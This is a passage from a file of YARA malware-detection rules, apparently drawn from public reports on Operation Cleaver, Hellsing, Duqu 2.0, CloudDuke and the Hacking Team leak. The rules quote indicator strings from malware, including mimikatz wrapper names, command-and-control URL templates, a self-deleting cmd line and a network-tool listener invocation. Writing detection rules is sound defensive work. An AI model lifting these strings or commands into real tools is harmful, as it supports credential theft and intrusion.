reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "NetC.exe" wide
$s2 = "Net Service"
condition:
all of them
}
rule SSC_OPCLEAVER_wndTest
{
meta:
description = "Backdoor used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "[Alt]" wide
$s2 = "<< %s >>:" wide
$s3 = "Content-Disposition: inline; comp=%s; account=%s; product=%d;"
condition:
all of them
}
rule SSC_OPCLEAVER_ShellCreator2
{
meta:
description = "Shell Creator used by attackers in Operation Cleaver to create ASPX web shells"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "ShellCreator2.Properties"
$s2 = "set_IV"
condition:
all of them
}
rule SSC_OPCLEAVER_SynFlooder
{
meta:
description = "Malware or hack tool used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "Unable to resolve [ %s ]. ErrorCode %d"
$s2 = "your targets IP is : %s"
$s3 = "Raw TCP Socket Created successfully."
condition:
all of them
}
rule SSC_antivirusdetector
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "getShadyProcess"
$s2 = "getSystemAntiviruses"
$s3 = "AntiVirusDetector"
condition:
all of them
}
rule SSC_zhmimikatz
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "MimikatzRunner"
$s2 = "zhmimikatz"
condition:
all of them
}
rule SSC_ShellCreator2
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "ShellCreator2.Properties"
$s2 = "set_IV"
condition:
all of them
}
rule SSC_SmartCopy2
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "SmartCopy2.Properties"
$s2 = "ZhuFrameWork"
condition:
all of them
}
rule SSC_OPCLEAVER_zhCat
{
meta:
description = "Network tool used by Iranian hackers and used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "Mozilla/4.0 ( compatible; MSIE 7.0; AOL 8.0 )" ascii fullword
$s2 = "ABC ( A Big Company )" wide fullword
condition:
all of them
}
rule SSC_Zh0uSh311
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "Zh0uSh311"
condition:
all of them
}
rule SSC_kagent
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "kill command is in last machine, going back"
$s2 = "message data length in B64: %d Bytes"
condition:
all of them
}
rule SSC_OPCLEAVER_kagent
{
meta:
description = "Backdoor used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "kill command is in last machine, going back"
$s2 = "message data length in B64: %d Bytes"
condition:
all of them
}
rule SSC_zhCat
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "zhCat -l -h -tp 1234"
$s2 = "ABC ( A Big Company )" wide
condition:
all of them
}
rule SSC_OPCLEAVER_mimikatzWrapper
{
meta:
description = "Mimikatz Wrapper used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "mimikatzWrapper"
$s2 = "get_mimikatz"
condition:
all of them
}
rule SSC_OPCLEAVER_ZhoupinExploitCrew
{
meta:
description = "Keywords used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "zhoupin exploit crew" nocase
$s2 = "zhopin exploit crew" nocase
condition:
1 of them
}
rule SSC_OPCLEAVER_csext
{
meta:
description = "Backdoor used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "COM+ System Extentions"
$s2 = "csext.exe"
$s3 = "COM_Extentions_bin"
condition:
all of them
}
rule SSC_mimikatzWrapper : Toolkit
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "mimikatzWrapper"
$s2 = "get_mimikatz"
condition:
all of them
}
rule SSC_OPCLEAVER_pvz_in
{
meta:
description = "Parviz tool used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "LAST_TIME=00/00/0000:00:00PM$"
$s2 = "if %%ERRORLEVEL%% == 1 GOTO line"
condition:
all of them
}
rule SSC_OPCLEAVER_TinyZBot
{
meta:
description = "Tiny Bot used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "NetScp" wide
$s2 = "TinyZBot.Properties.Resources.resources"
$s3 = "Aoao WaterMark"
$s4 = "Run_a_exe"
$s5 = "netscp.exe"
$s6 = "get_MainModule_WebReference_DefaultWS"
$s7 = "remove_CheckFileMD5Completed"
$s8 = "http://tempuri.org/"
$s9 = "Zhoupin_Cleaver"
condition:
(($s1 and $s2) or ($s3 and $s4 and $s5) or ($s6 and $s7 and $s8) or $s9)
}
rule SSC_SFXRAR_Acrotray
{
meta:
description = "Most likely a malicious file acrotray in SFX RAR / CloudDuke APT 5442.1.exe, 5442.2.exe"
author = "Florian Roth"
reference = "https://www.f-secure.com/weblog/archives/00002822.html"
date = "2015-07-22"
super_rule = 1
score = 70
hash1 = "51e713c7247f978f5836133dd0b8f9fb229e6594763adda59951556e1df5ee57"
hash2 = "5d695ff02202808805da942e484caa7c1dc68e6d9c3d77dc383cfa0617e61e48"
hash3 = "56531cc133e7a760b238aadc5b7a622cd11c835a3e6b78079d825d417fb02198"
strings:
$s1 = "winrarsfxmappingfile.tmp" fullword wide /* PEStudio Blacklist: strings */
$s2 = "GETPASSWORD1" fullword wide /* PEStudio Blacklist: strings */
$s3 = "acrotray.exe" fullword ascii
$s4 = "CryptUnprotectMemory failed" fullword wide /* PEStudio Blacklist: strings */
condition:
uint16(0) == 0x5a4d and filesize < 2449KB and all of them
}
rule SSC_CloudDuke_Malware
{
meta:
description = "Detects CloudDuke Malware"
author = "Florian Roth"
reference = "https://www.f-secure.com/weblog/archives/00002822.html"
date = "2015-07-22"
score = 60
hash1 = "97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7"
hash2 = "88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f"
hash3 = "1d4ac97d43fab1d464017abb5d57a6b4601f99eaa93b01443427ef25ae5127f7"
hash4 = "97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7"
hash5 = "1d4ac97d43fab1d464017abb5d57a6b4601f99eaa93b01443427ef25ae5127f7"
hash6 = "88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f"
hash7 = "ed7abf93963395ce9c9cba83a864acb4ed5b6e57fd9a6153f0248b8ccc4fdb46"
hash8 = "97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7"
hash9 = "ed7abf93963395ce9c9cba83a864acb4ed5b6e57fd9a6153f0248b8ccc4fdb46"
hash10 = "ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145"
hash11 = "a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004"
hash12 = "56ac764b81eb216ebed5a5ad38e703805ba3e1ca7d63501ba60a1fb52c7ebb6e"
hash13 = "ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145"
hash14 = "a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004"
hash15 = "56ac764b81eb216ebed5a5ad38e703805ba3e1ca7d63501ba60a1fb52c7ebb6e"
strings:
$s1 = "ProcDataWrap" fullword ascii
$s2 = "imagehlp.dll" fullword ascii
$s3 = "dnlibsh" fullword ascii
$s4 = "%ws_out%ws" fullword wide
$s5 = "Akernel32.dll" fullword wide
$op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b } /* Opcode */
$op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f } /* Opcode */
$op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 720KB and 4 of ($s*) and 1 of ($op*)
}
rule SSC_MiniDionis_readerView
{
meta:
description = "MiniDionis Malware - file readerView.exe / adobe.exe"
author = "Florian Roth"
reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
date = "2015-07-20"
/* Original Hash */
hash1 = "ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145"
/* Derived Samples */
hash2 = "a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004"
hash3 = "88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f"
hash4 = "97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7"
hash5 = "ed7abf93963395ce9c9cba83a864acb4ed5b6e57fd9a6153f0248b8ccc4fdb46"
hash6 = "56ac764b81eb216ebed5a5ad38e703805ba3e1ca7d63501ba60a1fb52c7ebb6e"
strings:
$s1 = "%ws_out%ws" fullword wide /* score: '8.00' */
$s2 = "dnlibsh" fullword ascii /* score: '7.00' */
$op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b } /* Opcode */
$op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f } /* Opcode */
$op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 500KB and all of ($s*) and 1 of ($op*)
}
rule SSC_Malicious_SFX1
{
meta:
description = "SFX with voicemail content"
author = "Florian Roth"
reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
date = "2015-07-20"
hash = "c0675b84f5960e95962d299d4c41511bbf6f8f5f5585bdacd1ae567e904cb92f"
strings:
$s0 = "voicemail" ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
$s1 = ".exe" ascii
condition:
uint16(0) == 0x4b50 and filesize < 1000KB and $s0 in (3..80) and $s1 in (3..80)
}
rule SSC_Malicious_SFX2
{
meta:
description = "SFX with adobe.exe content"
author = "Florian Roth"
reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
date = "2015-07-20"
hash = "502e42dc99873c52c3ca11dd3df25aad40d2b083069e8c22dd45da887f81d14d"
strings:
$s1 = "adobe.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
$s2 = "Extracting files to %s folder$Extracting files to temporary folder" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00' */
$s3 = "GETPASSWORD1" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00' */
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}
rule SSC_MiniDionis_VBS_Dropped
{
meta:
description = "Dropped File - 1.vbs"
author = "Florian Roth"
reference = "https://malwr.com/analysis/ZDc4ZmIyZDI4MTVjNGY5NWI0YzE3YjIzNGFjZTcyYTY/"
date = "2015-07-21"
hash = "97dd1ee3aca815eb655a5de9e9e8945e7ba57f458019be6e1b9acb5731fa6646"
strings:
$s1 = "Wscript.Sleep 5000" ascii
$s2 = "Set FSO = CreateObject(\"Scripting.FileSystemObject\")" ascii
$s3 = "Set WshShell = CreateObject(\"WScript.Shell\")" ascii
$s4 = "If(FSO.FileExists(\"" ascii
$s5 = "then FSO.DeleteFile(\".\\" ascii
condition:
filesize < 1KB and all of them and $s1 in (0..40)
}
rule SSC_EliseLotusBlossom
{
meta:
author = "Jose Ramon Palanco"
date = "2015-06-23"
description = "Elise Backdoor Trojan"
ref = "https://www.paloaltonetworks.com/resources/research/unit42-operation-lotus-blossom.html"
strings:
$magic = { 4d 5a }
$s1 = "\",Update" wide
$s2 = "LoaderDLL.dll"
$s3 = "Kernel32.dll"
$s4 = "{5947BACD-63BF-4e73-95D7-0C8A98AB95F2}"
$s5 = "\\Network\\" wide
$s6 = "0SSSSS"
$s7 = "441202100205"
$s8 = "0WWWWW"
condition:
$magic at 0 and all of ($s*)
}
rule SSC_APT_Hikit_msrv
{
meta:
author = "ThreatConnect Intelligence Research Team"
strings:
$m = {6D 73 72 76 2E 64 6C 6C 00 44 6C 6C}
condition:
any of them
}
rule SSC_apt_hellsing_proxytool
{
meta:
Author = "Costin Raiu, Kaspersky Lab"
Date = "2015-04-07"
Description = "detection for Hellsing proxy testing tool"
Reference = "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"
strings:
$mz="MZ"
$a1="PROXY_INFO: automatic proxy url => %s "
$a2="PROXY_INFO: connection type => %d "
$a3="PROXY_INFO: proxy server => %s "
$a4="PROXY_INFO: bypass list => %s "
$a5="InternetQueryOption failed with GetLastError() %d"
$a6="D:\\Hellsing\\release\\exe\\exe\\" nocase
condition:
($mz at 0) and (2 of ($a*)) and filesize < 300000
}
rule SSC_apt_hellsing_msgertype2
{
meta:
Author = "Costin Raiu, Kaspersky Lab"
Date = "2015-04-07"
Description = "detection for Hellsing msger type 2 implants"
Reference = "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"
strings:
$mz="MZ"
$a1="%s\\system\\%d.txt"
$a2="_msger"
$a3="http://%s/lib/common.asp?action=user_login&uid=%s&lan=%s&host=%s&os=%s&proxy=%s"
$a4="http://%s/data/%s.1000001000"
$a5="/lib/common.asp?action=user_upload&file="
$a6="%02X-%02X-%02X-%02X-%02X-%02X"
condition:
($mz at 0) and (4 of ($a*)) and filesize < 500000
}
rule SSC_apt_hellsing_irene
{
meta:
Author = "Costin Raiu, Kaspersky Lab"
Date = "2015-04-07"
Description = "detection for Hellsing msger irene installer"
Reference = "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"
strings:
$mz="MZ"
$a1="\\Drivers\\usbmgr.tmp" wide
$a2="\\Drivers\\usbmgr.sys" wide
$a3="common_loadDriver CreateFile error! "
$a4="common_loadDriver StartService error && GetLastError():%d! "
$a5="irene" wide
$a6="aPLib v0.43 - the smaller the better"
condition:
($mz at 0) and (4 of ($a*)) and filesize < 500000
}
rule SSC_apt_hellsing_implantstrings
{
meta:
Author = "Costin Raiu, Kaspersky Lab"
Date = "2015-04-07"
Description = "detection for Hellsing implants"
Reference = "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"
strings:
$mz="MZ"
$a1="the file uploaded failed !"
$a2="ping 127.0.0.1"
$b1="the file downloaded failed !"
$b2="common.asp"
$c="xweber_server.exe"
$d="action="
$debugpath1="d:\\Hellsing\\release\\msger\\" nocase
$debugpath2="d:\\hellsing\\sys\\xrat\\" nocase
$debugpath3="D:\\Hellsing\\release\\exe\\" nocase
$debugpath4="d:\\hellsing\\sys\\xkat\\" nocase
$debugpath5="e:\\Hellsing\\release\\clare" nocase
$debugpath6="e:\\Hellsing\\release\\irene\\" nocase
$debugpath7="d:\\hellsing\\sys\\irene\\" nocase
$e="msger_server.dll"
$f="ServiceMain"
condition:
($mz at 0) and (all of ($a*)) or (all of ($b*)) or ($c and $d) or (any of ($debugpath*)) or ($e and $f) and filesize < 500000
}
rule SSC_apt_hellsing_xkat
{
meta:
Author = "Costin Raiu, Kaspersky Lab"
Date = "2015-04-07"
Description = "detection for Hellsing xKat tool"
Reference = "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"
strings:
$mz="MZ"
$a1="\\Dbgv.sys"
$a2="XKAT_BIN"
$a3="release sys file error."
$a4="driver_load error. "
$a5="driver_create error."
$a6="delete file:%s error."
$a7="delete file:%s ok."
$a8="kill pid:%d error."
$a9="kill pid:%d ok."
$a10="-pid-delete"
$a11="kill and delete pid:%d error."
$a12="kill and delete pid:%d ok."
condition:
($mz at 0) and (6 of ($a*)) and filesize < 300000
}
rule SSC_apt_hellsing_installer
{
meta:
Author = "Costin Raiu, Kaspersky Lab"
Date = "2015-04-07"
Description = "detection for Hellsing xweber/msger installers"
Reference = "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"
strings:
$mz="MZ"
$cmd="cmd.exe /c ping 127.0.0.1 -n 5&cmd.exe /c del /a /f \"%s\""
$a1="xweber_install_uac.exe"
$a2="system32\\cmd.exe" wide
$a4="S11SWFOrVwR9UlpWRVZZWAR0U1aoBHFTUl2oU1Y="
$a5="S11SWFOrVwR9dnFTUgRUVlNHWVdXBFpTVgRdUlpWRVZZWARdUqhZVlpFR1kEUVNSXahTVgRaU1YEUVNSXahTVl1SWwRZValdVFFZUqgQBF1SWlZFVllYBFRTVqg=" $a6="7dqm2ODf5N/Y2N/m6+br3dnZpunl44g="
$a7="vd/m7OXd2ai/5u7a59rr7Ki45drcqMPl5t/c5dqIZw=="
$a8="vd/m7OXd2ai/usPl5qjY2uXp69nZqO7l2qjf5u7a59rr7Kjf5tzr2u7n6euo4+Xm39zl2qju5dqo4+Xm39zl2t/m7ajr19vf2OPr39rj5eaZmqbs5OSI Njl2tyI" $a9="C:\\Windows\\System32\\sysprep\\sysprep.exe" wide
$a10="%SystemRoot%\\system32\\cmd.exe" wide
$a11="msger_install.dll"
$a12={00 65 78 2E 64 6C 6C 00}
condition:
($mz at 0) and ($cmd and (2 of ($a*))) and filesize < 500000
}
rule SSC_HackingTeam_Elevator_EXE
{
meta:
description = "Hacking Team Disclosure Sample - file elevator.exe"
author = "Florian Roth"
reference = "Hacking Team Disclosure elevator.c"
date = "2015-07-07"
hash1 = "40a10420b9d49f87527bc0396b19ec29e55e9109e80b52456891243791671c1c"
hash2 = "92aec56a859679917dffa44bd4ffeb5a8b2ee2894c689abbbcbe07842ec56b8d"
hash = "9261693b67b6e379ad0e57598602712b8508998c0cb012ca23139212ae0009a1"
strings:
$x1 = "CRTDLL.DLL" fullword ascii
$x2 = "\\sysnative\\CI.dll" fullword ascii
$x3 = "\\SystemRoot\\system32\\CI.dll" fullword ascii
$x4 = "C:\\\\Windows\\\\Sysnative\\\\ntoskrnl.exe" fullword ascii /* PEStudio Blacklist: strings */
$s1 = "[*] traversing processes" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "_getkprocess" fullword ascii /* PEStudio Blacklist: strings */
$s3 = "[*] LoaderConfig %p" fullword ascii /* PEStudio Blacklist: strings */
$s4 = "loader.obj" fullword ascii /* PEStudio Blacklist: strings */
$s5 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3" ascii /* PEStudio Blacklist: strings */
$s6 = "[*] token restore" fullword ascii /* PEStudio Blacklist: strings */
$s7 = "elevator.obj" fullword ascii
$s8 = "_getexport" fullword ascii /* PEStudio Blacklist: strings */
condition:
uint16(0) == 0x5a4d and filesize < 3000KB and all of ($x*) and 3 of ($s*)
}
rule SSC_Hackingteam_Elevator_DLL
{
meta:
description = "Hacking Team Disclosure Sample - file elevator.dll"
author = "Florian Roth"
reference = "http://t.co/EG0qtVcKLh"
date = "2015-07-07"
hash = "b7ec5d36ca702cc9690ac7279fd4fea28d8bd060"
strings:
$s1 = "\\sysnative\\CI.dll" fullword ascii
$s2 = "setx TOR_CONTROL_PASSWORD" fullword ascii
$s3 = "mitmproxy0" fullword ascii
$s4 = "\\insert_cert.exe" fullword ascii
$s5 = "elevator.dll" fullword ascii
$s6 = "CRTDLL.DLL" fullword ascii
$s7 = "fail adding cert" fullword ascii
$s8 = "DownloadingFile" fullword ascii
$s9 = "fail adding cert: %s" fullword ascii
$s10 = "InternetOpenA fail" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and 6 of them
}
rule SSC_bin_ndisk
{
meta:
description = "Hacking Team Disclosure Sample - file ndisk.sys"
author = "Florian Roth"
reference = "https://www.virustotal.com/en/file/a03a6ed90b89945a992a8c69f716ec3c743fa1d958426f4c50378cca5bef0a01/analysis/1436184181/"
date = "2015-07-07"
hash = "cf5089752ba51ae827971272a5b761a4ab0acd84"
strings:
$s1 = "\\Registry\\Machine\\System\\ControlSet00%d\\services\\ndisk.sys" fullword wide
$s2 = "\\Registry\\Machine\\System\\ControlSet00%d\\Enum\\Root\\LEGACY_NDISK.SYS" fullword wide
$s3 = "\\Driver\\DeepFrz" fullword wide
$s4 = "Microsoft Kernel Disk Manager" fullword wide
$s5 = "ndisk.sys" fullword wide
$s6 = "\\Device\\MSH4DEV1" fullword wide
$s7 = "\\DosDevices\\MSH4DEV1" fullword wide
$s8 = "built by: WinDDK" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 30KB and 6 of them
}
rule SSC_RCS_Backdoor
{
meta:
description = "Hacking Team RCS Backdoor"
author = "botherder https://github.com/botherder"
strings:
$filter1 = "$debug3"
$filter2 = "$log2"
$filter3 = "error2"
$debug1 = /\- (C)hecking components/ wide ascii
$debug2 = /\- (A)ctivating hiding system/ wide ascii
$debug3 = /(f)ully operational/ wide ascii
$log1 = /\- Browser activity \(FF\)/ wide ascii
$log2 = /\- Browser activity \(IE\)/ wide ascii
// Cause false positives.
//$log3 = /\- About to call init routine at %p/ wide ascii
//$log4 = /\- Calling init routine at %p/ wide ascii
$error1 = /\[Unable to deploy\]/ wide ascii
$error2 = /\[The system is already monitored\]/ wide ascii
condition:
(2 of ($debug*) or 2 of ($log*) or all of ($error*)) and not any of ($filter*)
}
rule SSC_RCS_Scout
{
meta:
description = "Hacking Team RCS Scout"
author = "botherder https://github.com/botherder"
strings:
$filter1 = "$engine5"
$filter2 = "$start4"
$filter3 = "$upd2"
$filter4 = "$lookma6"
$engine1 = /(E)ngine started/ wide ascii
$engine2 = /(R)unning in background/ wide ascii
$engine3 = /(L)ocking doors/ wide ascii
$engine4 = /(R)otors engaged/ wide ascii
$engine5 = /(I)\'m going to start it/ wide ascii
$start1 = /Starting upgrade\!/ wide ascii
$start2 = /(I)\'m going to start the program/ wide ascii
$start3 = /(i)s it ok\?/ wide ascii
$start4 = /(C)lick to start the program/ wide ascii
$upd1 = /(U)pdJob/ wide ascii
$upd2 = /(U)pdTimer/ wide ascii
$lookma1 = /(O)wning PCI bus/ wide
$lookma2 = /(F)ormatting bios/ wide
$lookma3 = /(P)lease insert a disk in drive A:/ wide
$lookma4 = /(U)pdating CPU microcode/ wide
$lookma5 = /(N)ot sure what's happening/ wide
$lookma6 = /(L)ook ma, no thread id\! \\\\o\// wide
condition:
(all of ($engine*) or all of ($start*) or all of ($upd*) or 4 of ($lookma*)) and not any of ($filter*)
}
rule SSC_Emissary_APT_Malware_1
{
meta:
description = "Detect Emissary Malware - from samples A08E81B411.DAT, ishelp.dll"
author = "Florian Roth"
reference = "http://goo.gl/V0epcf"
date = "2016-01-02"
score = 75
hash1 = "9420017390c598ee535c24f7bcbd39f40eca699d6c94dc35bcf59ddf918c59ab"
hash2 = "70561f58c9e5868f44169854bcc906001947d98d15e9b4d2fbabd1262d938629"
hash3 = "0e64e68f6f88b25530699a1cd12f6f2790ea98e6e8fa3b4bc279f8e5c09d7290"
hash4 = "69caa2a4070559d4cafdf79020c4356c721088eb22398a8740dea8d21ae6e664"
hash5 = "675869fac21a94c8f470765bc6dd15b17cc4492dd639b878f241a45b2c3890fc"
hash6 = "e817610b62ccd00bdfc9129f947ac7d078d97525e9628a3aa61027396dba419b"
hash7 = "a8b0d084949c4f289beb4950f801bf99588d1b05f68587b245a31e8e82f7a1b8"
hash8 = "acf7dc5a10b00f0aac102ecd9d87cd94f08a37b2726cb1e16948875751d04cc9"
hash9 = "e21b47dfa9e250f49a3ab327b7444902e545bed3c4dcfa5e2e990af20593af6d"
hash10 = "e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538"
hash11 = "29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051"
hash12 = "98fb1d2975babc18624e3922406545458642e01360746870deee397df93f50e0"
hash13 = "fbcb401cf06326ab4bb53fb9f01f1ca647f16f926811ea66984f1a1b8cf2f7bb"
strings:
$s1 = "cmd.exe /c %s > %s" fullword ascii
$s2 = "execute cmd timeout." fullword ascii
$s3 = "rundll32.exe \"%s\",Setting" fullword ascii
$s4 = "DownloadFile - exception:%s." fullword ascii
$s5 = "CDllApp::InitInstance() - Evnet create successful." fullword ascii
$s6 = "UploadFile - EncryptBuffer Error" fullword ascii
$s7 = "WinDLL.dll" fullword wide
$s8 = "DownloadFile - exception:%s,code:0x%08x." fullword ascii
$s9 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" fullword ascii
$s10 = "CDllApp::InitInstance() - Evnet already exists." fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 250KB and 3 of them
}
rule SSC_apt_duqu2_drivers
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect Duqu 2.0 drivers"
last_modified = "2015-06-09"
version = "1.0"
strings:
$a1 = "\\DosDevices\\port_optimizer" wide nocase
$a2 = "romanian.antihacker"
$a3 = "PortOptimizerTermSrv" wide
$a4 = "ugly.gorilla1"
$b1 = "NdisIMCopySendCompletePerPacketInfo"
$b2 = "NdisReEnumerateProtocolBindings"
$b3 = "NdisOpenProtocolConfiguration"
condition:
uint16(0) == 0x5A4D and (any of ($a*) ) and (2 of ($b*)) and filesize < 100000
}
rule SSC_apt_duqu2_loaders
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect Duqu 2.0 samples"
last_modified = "2015-06-09"
version = "1.0"
strings:
$a1 = "{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}" wide
$a2 = "\\\\.\\pipe\\{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}" wide
$a4 = "\\\\.\\pipe\\{AB6172ED-8105-4996-9D2A-597B5F827501}" wide
$a5 = "Global\\{B54E3268-DE1E-4c1e-A667-2596751403AD}" wide
$a8 = "SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'" wide
$a9 = "SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'" wide
$a7 = "SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'" wide
$b1 = "MSI.dll"
$b2 = "msi.dll"
$b3 = "StartAction"
$c1 = "msisvc_32@" wide
$c2 = "PROP=" wide
$c3 = "-Embedding" wide
$c4 = "S:(ML;;NW;;;LW)" wide
$d1 = "NameTypeBinaryDataCustomActionActionSourceTargetInstallExecuteSequenceConditionSequencePropertyValueMicrosoftManufacturer" nocase
$d2 = {2E 3F 41 56 3F 24 5F 42 69 6E 64 40 24 30 30 58 55 3F 24 5F 50 6D 66 5F 77 72 61 70 40 50 38 43 4C 52 ?? 40 40 41 45 58 58 5A 58 56 31 40 24 24 24 56 40 73 74 64 40 40 51 41 56 43 4C 52 ?? 40 40 40 73 74 64 40 40}
condition:
( (uint16(0) == 0x5a4d) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) ) and filesize < 100000 ) or ( (uint32(0) == 0xe011cfd0) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) or (any of ($d*)) ) and filesize < 20000000 )
}
rule SSC_APT_Kaspersky_Duqu2_msi3_32
{
meta:
description = "Kaspersky APT Report - Duqu2 Sample - file d8a849654ab97debaf28ae5b749c3b1ff1812ea49978713853333db48c3972c3"
author = "Florian Roth"
reference = "https://goo.gl/7yKyOj"
date = "2015-06-10"
hash = "53d9ef9e0267f10cc10f78331a9e491b3211046b"
strings:
$s0 = "ProcessUserAccounts" fullword ascii /* PEStudio Blacklist: strings */
$s1 = "SELECT `UserName`, `Password`, `Attributes` FROM `CustomUserAccounts`" fullword wide /* PEStudio Blacklist: strings */
$s2 = "SELECT `UserName` FROM `CustomUserAccounts`" fullword wide /* PEStudio Blacklist: strings */
$s3 = "SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'" fullword wide
$s4 = "msi3_32.dll" fullword wide
$s5 = "RunDLL" fullword ascii
$s6 = "MSI Custom Action v3" fullword wide
$s7 = "msi3_32" fullword wide
$s8 = "Operating System" fullword wide /* PEStudio Blacklist: strings */ /* Goodware String - occured 9203 times */
condition:
uint16(0) == 0x5a4d and filesize < 72KB and all of them
}
rule SSC_APT_Kaspersky_Duqu2_procexp
{
meta:
description = "Kaspersky APT Report - Duqu2 Sample - Malicious MSI"
author = "Florian Roth"
reference = "https://goo.gl/7yKyOj"
date = "2015-06-10"
hash1 = "2422835716066b6bcecb045ddd4f1fbc9486667a"
hash2 = "b120620b5d82b05fee2c2153ceaf305807fa9f79"
